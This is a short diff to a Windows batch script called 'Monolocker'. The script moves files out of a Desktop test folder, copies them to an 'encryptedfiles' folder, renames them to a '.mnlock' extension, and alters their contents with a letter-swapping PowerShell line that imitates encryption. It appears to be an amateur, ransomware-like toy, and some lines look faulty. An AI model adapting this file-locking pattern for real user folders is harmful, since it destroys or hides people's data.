@@ -1,11 +1,11 @@
 pause
-cd c:\
+cd C:\
 pause
 md Monolocker
 pause
 cd C:\
 pause
-move /y %userprofile%\Desktop\test\*.* c:\Monolocker
+move /y %userprofile%\Desktop\test\ C:\Monolocker
 pause
 cd %userprofile%\Desktop
 pause
@@ -13,10 +13,11 @@ md encryptedfiles
 pause
 cd c:\
 pause
-xcopy c:\Monolocker\*.* %userprofile%\Desktop\encryptedfiles *.* /e
+xcopy c:\Monolocker\*.* %userprofile%\Desktop\encryptedfiles\*.* /e
 pause
 cd %userprofile%\Desktop\encryptedfiles
 pause
-rename *.* *.mnlock
+rename *.* "????????????????????????????.mnlock"
+
+powershell -Command "(gc *.mnlock) -replace 'e', 'q' | Out-File -encoding ASCII *.mnlock"
 pause
-type nul >> %userprofile%\Desktop\encryptedfiles\*.mnlock
